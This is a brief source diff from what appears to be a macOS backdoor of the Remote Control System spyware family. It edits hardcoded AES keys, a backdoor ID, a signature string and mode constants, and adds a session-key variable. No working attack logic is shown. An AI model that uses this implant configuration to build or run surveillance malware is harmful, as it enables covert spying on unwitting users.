@@ -32,7 +32,7 @@ char  gLogAesKey[]      = "cicuvDYvl9jZMH5QS26cEAijS8QqIfCX";
 #ifndef DEV_MODE
 char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
 #else
-char  gConfAesKey[]     = "VAWwHUKcMx7gyOpjnAwq49PbVcl9KSu1";
+char  gConfAesKey[]     = "oTfug1JYLAR62r07RLSgpWnPrjSPmnRF";
 #endif
 
 // Instance ID (20 bytes) unique per backdoor/user
@@ -42,14 +42,14 @@ char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";
 #ifndef DEV_MODE
 char gBackdoorID[]  = "av3pVck1gb4eR2d8";
 #else
-char gBackdoorID[16] = "RCS_0000000015";
+char gBackdoorID[16]  = "RCS_0000000307";
 #endif
 
 // Challenge Key
 #ifndef DEV_MODE
-char gChallenge[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
+char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
 #else
-char gChallenge[] = "eI5QOD4mGQA8pD7IqEL2TT7tkd9+xaIY";
+char gBackdoorSignature[] = "4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z";
 #endif
 
 //
@@ -60,7 +60,7 @@ char gChallenge[] = "eI5QOD4mGQA8pD7IqEL2TT7tkd9+xaIY";
 #ifndef DEV_MODE
 char gMode[]          = "iuherEoR93457dFADfasDjfNkA7Txmkl";
 #else
-char gMode[]          = UISPOOF;
+char gMode[]          = "Ah57K";
 #endif
 
 RCSMSharedMemory  *gSharedMemoryCommand;
@@ -69,6 +69,7 @@ RCSMUtils         *gUtil;
 
 NSLock            *gSuidLock        = nil;
 NSLock            *gControlFlagLock = nil;
+NSData            *gSessionKey      = nil;
 
 NSString *gBackdoorName             = nil;
 NSString *gBackdoorUpdateName       = nil;
